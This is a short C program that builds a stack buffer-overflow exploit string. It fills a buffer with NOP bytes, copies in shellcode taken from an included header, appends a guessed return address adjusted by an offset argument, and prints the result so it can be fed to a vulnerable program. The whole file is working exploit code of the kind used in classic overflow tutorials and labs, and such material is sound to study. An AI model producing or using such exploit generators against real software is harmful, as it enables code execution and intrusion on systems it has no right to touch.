#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "shellcode.h"

int main(int argc, char *argv[]) {
    char *buff, *ptr, *sc;
    long *addr_ptr, addr;
    int i, buff_size, offset;

    if (argc < 3) {
        printf("Not enough command line arguments: %s buffer-size offset\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    buff_size = atoi(argv[1]) + 8;
    offset = atoi(argv[2]);

    sc = alt_shellcode;

    buff = malloc(buff_size + 1);  // Additional byte for final '\0'
    if (buff == NULL) {
        // Memory allocation failed
        return 1;
    }

    addr = 0xff010101 + offset;

    // Fill buffer with NOPs
    for (i = 0; i < buff_size; i++) {
        buff[i] = NOP;
    }

    ptr = buff + buff_size - 8;
    addr_ptr = (long *)ptr;

    // Fill last 8 bytes of the buffer with twice the calculated address
    for (i = 0; i < 8; i += 4) {
        *(addr_ptr++) = addr;
    }

    ptr = buff + buff_size - 8 - strlen(sc);
    for (i = 0; i < strlen(sc); i++) {
        *(ptr++) = sc[i];
    }

    buff[buff_size] = '\0';
    puts(buff);

    return 0;
}
